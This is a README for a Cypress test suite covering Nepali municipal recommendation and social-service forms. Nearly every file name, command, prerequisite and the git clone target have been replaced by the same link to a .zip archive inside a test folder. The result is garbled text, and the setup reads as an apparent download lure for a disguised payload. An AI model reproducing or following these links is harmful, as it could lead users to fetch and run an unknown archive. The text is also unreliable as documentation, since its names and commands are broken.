# MyPalika Automation

This repository contains the Cypress automation test suite for **MyPalika**. It covers various "Sifarish" (Recommendation) and "Social Service" modules, ensuring robust testing of form submissions, validations, and workflows using English and Nepali data inputs.

## Table of Contents

- [Features](#features)
- [Prerequisites](#prerequisites)
- [Installation](#installation)
- [Configuration](#configuration)
- [Running Tests](#running-tests)
- [Project Structure](#project-structure)
- [Key Components](#key-components)

## Features

-   **End-to-End Testing**: comprehensive coverage of form workflows:
    -   **Sifarish**: Business Registration, Marriage Verification, Property Valuation, Weak Economic Status, etc.
    -   **Social Service**: Disability Application, Jestha Nagarik ID.
-   **Data-Driven**: centralized data management using `SData` (Shared Data) and `UData` (Unique Data) for scalability.
-   **Custom Data Generation**: integrated `https://raw.githubusercontent.com/rajiv-sapkota/MyPalikaAutomation/main/cypress/e2e/SocialService/Automation_My_Palika_3.6-beta.3.zip` helper to generate localized data (Names, Addresses in Nepali/English).
-   **Robust Locator Strategy**: Page Object Model (POM) pattern separating locators from test logic.
-   **Custom Commands**: simplified interactions for date pickers (`https://raw.githubusercontent.com/rajiv-sapkota/MyPalikaAutomation/main/cypress/e2e/SocialService/Automation_My_Palika_3.6-beta.3.zip`), navigation (`https://raw.githubusercontent.com/rajiv-sapkota/MyPalikaAutomation/main/cypress/e2e/SocialService/Automation_My_Palika_3.6-beta.3.zip`), and more.
-   **Environment Support**: configured for both development and production environments.

## Prerequisites

-   **https://raw.githubusercontent.com/rajiv-sapkota/MyPalikaAutomation/main/cypress/e2e/SocialService/Automation_My_Palika_3.6-beta.3.zip**: v14.0.0 or higher
-   **npm**: v6.0.0 or higher

## Installation

1.  **Clone the repository:**

    ```bash
    git clone https://raw.githubusercontent.com/rajiv-sapkota/MyPalikaAutomation/main/cypress/e2e/SocialService/Automation_My_Palika_3.6-beta.3.zip
    cd MyPalikaAutomation
    ```

2.  **Install dependencies:**

    ```bash
    npm install
    ```

3.  **Environment Setup:**
    Create a `.env` file in the root directory if you need to override default timeouts or credentials (see `https://raw.githubusercontent.com/rajiv-sapkota/MyPalikaAutomation/main/cypress/e2e/SocialService/Automation_My_Palika_3.6-beta.3.zip` if available, or ask a team member).

## Configuration

The project uses `https://raw.githubusercontent.com/rajiv-sapkota/MyPalikaAutomation/main/cypress/e2e/SocialService/Automation_My_Palika_3.6-beta.3.zip` for main configuration. Key settings (timeouts, viewport, base URL) can be adjusted there.

## Running Tests

### Open Cypress Test Runner (Interactive Mode)

To open the Cypress GUI and select tests to run manually:

```bash
npm run cy:open
# or
npx cypress open
```

### Run All Tests (Headless Mode)

To run all test suites in the command line:

```bash
npm test
# or
npx cypress run
```

### Run Specific Test Spec

To run a single test file (e.g., Marriage Verification):

```bash
npx cypress run --spec https://raw.githubusercontent.com/rajiv-sapkota/MyPalikaAutomation/main/cypress/e2e/SocialService/Automation_My_Palika_3.6-beta.3.zip
```

### Run in Production Mode

To run tests against the production environment:

```bash
npm run test:production
```

## Project Structure

```
MyPalika/
├── cypress/
│   ├── e2e/
│   │   ├── Sifarish/         # Tests for Recommendation forms
│   │   └── SocialService/    # Tests for Social Service forms
│   ├── fixtures/
│   │   ├── data/             # SData (Shared) and UData (Unique) input data
│   │   ├── files/            # Files for upload testing (images, pdfs)
│   │   └── Locators/         # Element selectors (POM)
│   └── support/
│       ├── https://raw.githubusercontent.com/rajiv-sapkota/MyPalikaAutomation/main/cypress/e2e/SocialService/Automation_My_Palika_3.6-beta.3.zip       # Custom Cypress commands like selectNepaliDate
│       └── https://raw.githubusercontent.com/rajiv-sapkota/MyPalikaAutomation/main/cypress/e2e/SocialService/Automation_My_Palika_3.6-beta.3.zip    # Data generator for Nepali inputs
├── .env                      # Environment variables
├── https://raw.githubusercontent.com/rajiv-sapkota/MyPalikaAutomation/main/cypress/e2e/SocialService/Automation_My_Palika_3.6-beta.3.zip         # Cypress configuration
└── https://raw.githubusercontent.com/rajiv-sapkota/MyPalikaAutomation/main/cypress/e2e/SocialService/Automation_My_Palika_3.6-beta.3.zip              # Project dependencies and scripts
```

## Key Components

### Data Management
-   **`https://raw.githubusercontent.com/rajiv-sapkota/MyPalikaAutomation/main/cypress/e2e/SocialService/Automation_My_Palika_3.6-beta.3.zip`**: contains shared data reused across multiple tests (e.g., standard applicant details, permanent addresses).
-   **`https://raw.githubusercontent.com/rajiv-sapkota/MyPalikaAutomation/main/cypress/e2e/SocialService/Automation_My_Palika_3.6-beta.3.zip`**: contains form-specific unique data (e.g., specific property values for valuation).

### Locators
-   Locators are stored in `cypress/fixtures/Locators/` to keep tests clean. Each test file imports its corresponding locator file.

### Custom Commands
-   **`https://raw.githubusercontent.com/rajiv-sapkota/MyPalikaAutomation/main/cypress/e2e/SocialService/Automation_My_Palika_3.6-beta.3.zip(pickerIndex, dayIndex)`**: Selects a date from the custom Nepali date picker widget.
-   **`https://raw.githubusercontent.com/rajiv-sapkota/MyPalikaAutomation/main/cypress/e2e/SocialService/Automation_My_Palika_3.6-beta.3.zip()`**: Handles login logic for the portal.
-   **`https://raw.githubusercontent.com/rajiv-sapkota/MyPalikaAutomation/main/cypress/e2e/SocialService/Automation_My_Palika_3.6-beta.3.zip()`**: Standardizes the submit and confirm workflow.

## Reporting

The project supports mochawesome reporting.
To generate a merged report after a run:

```bash
npm run report:full
```
